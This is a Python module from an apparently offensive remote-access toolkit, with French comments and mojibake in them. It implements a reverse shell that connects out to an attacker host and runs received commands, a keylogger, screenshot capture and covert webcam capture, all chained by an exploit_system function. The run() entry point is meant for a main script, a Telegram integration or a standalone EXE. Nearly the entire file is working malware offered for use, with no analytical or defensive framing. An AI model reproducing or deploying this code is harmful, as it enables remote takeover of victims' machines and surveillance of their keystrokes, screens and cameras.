# modules/exploit_sys.py

import os
import sys
import socket
import subprocess
import time
from datetime import datetime
from pathlib import Path

# üì¶ Import racine du projet
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, ".."))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# üîê Configuration globale (LHOST, LPORT)
try:
    from core.config import LHOST, LPORT
except Exception:
    LHOST, LPORT = "127.0.0.1", 4444  # Valeurs par d√©faut si .env absent

# üìÅ R√©pertoires
BASE_DIR = Path(project_root)
OUTPUT_DIR = BASE_DIR / "outputs"
KEYLOG_PATH = OUTPUT_DIR / "keylogs" / "keylog.txt"
SCREENSHOT_PATH = OUTPUT_DIR / "screenshots" / f"screenshot_{datetime.now():%Y%m%d_%H%M%S}.png"
WEBCAM_PATH = OUTPUT_DIR / "screenshots" / f"webcam_{datetime.now():%Y%m%d_%H%M%S}.jpg"

# üìÇ Cr√©ation des dossiers n√©cessaires
try:
    for path in [KEYLOG_PATH.parent, SCREENSHOT_PATH.parent]:
        os.makedirs(path, exist_ok=True)
except Exception:
    pass

# üîÑ Import silencieux des modules facultatifs
try:
    import pyautogui
except Exception:
    pyautogui = None

try:
    import cv2
except Exception:
    cv2 = None

# üêö Reverse shell vers machine attaquante
def reverse_shell(ip=None, port=None):
    ip = ip or LHOST
    port = port or LPORT
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send("[+] Connexion √©tablie\n".encode("utf-8"))
        while True:
            cmd = s.recv(1024).decode("utf-8").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if cmd:
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(str(e).encode("utf-8"))
        s.close()
    except Exception as e:
        try:
            with open("error_log.txt", "a") as f:
                f.write(f"{datetime.now()} - Reverse shell failed: {e}\n")
        except:
            pass

# ‚å®Ô∏è Keylogger
def start_keylogger(duration_sec=60):
    try:
        from pynput.keyboard import Listener

        def on_press(key):
            try:
                with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
                    ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                    char = getattr(key, 'char', None)
                    f.write(f"{ts}{char or str(key)}\n")
            except Exception:
                pass

        listener = Listener(on_press=on_press)
        listener.start()
        time.sleep(duration_sec)
        listener.stop()
    except Exception:
        pass

# üì∏ Screenshot
def take_screenshot():
    try:
        if pyautogui:
            pyautogui.screenshot(SCREENSHOT_PATH)
    except Exception:
        pass

# üé• Webcam
def capture_webcam():
    try:
        if cv2:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if ret:
                cv2.imwrite(str(WEBCAM_PATH), frame)
    except Exception:
        pass

# üéØ Exploitation compl√®te
def exploit_system(target_ip=None):
    reverse_shell(ip=target_ip)
    take_screenshot()
    capture_webcam()
    start_keylogger(60)

# ‚úÖ Entr√©e compatible main.py / Telegram
def run(ip=None):
    exploit_system(ip)

# üü¢ Point d‚Äôentr√©e si ex√©cution directe (EXE autonome)
if __name__ == "__main__":
    run()
